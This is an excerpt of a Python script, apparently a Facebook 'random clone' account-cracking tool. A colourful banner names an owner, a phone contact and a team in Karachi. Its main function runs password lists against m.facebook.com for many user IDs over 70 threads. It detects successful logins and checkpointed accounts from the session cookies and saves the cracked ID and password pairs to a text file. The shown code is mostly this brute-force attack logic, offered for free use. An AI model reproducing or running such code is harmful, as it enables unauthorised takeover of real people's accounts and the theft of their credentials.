...
\033[1;93m1 METHOD WORKING WITH PAKISTAN 
\33[1;37m---------------------------------------------
\033[32m→   Owner        :  SHERAZ ARAIN
\033[32m→   CONTACT  :  0097156438087 
\033[32m→   STATUS      :  FREE AND ENJOY 
\033[32m→    TEAM        : PAKISTAN.KARACHI
\033[32m→   Tool Type   :  \033[32mRENDOM CLONE
\033[32m→   Version       :  1.1 TEST
\33[1;37m----------------------------------------------""")
...
def riaz():
	...
	print('[3] WHATSAPP CONTACT HELPING')
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] Auto pass Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Khan pass all Method \x1b[1;92m2')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            ...
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN PAKISTANOK.txt : JXBCP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            response = requests.get('https://m.facebook.com/', cookies=cookies, headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[PAKISTAN] '+cid+'|'+ps+'\033[0;97m')
                open('PAKISTAN.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[PAKISTAN-CP] '+cid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mPAKISTAN.JXB\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
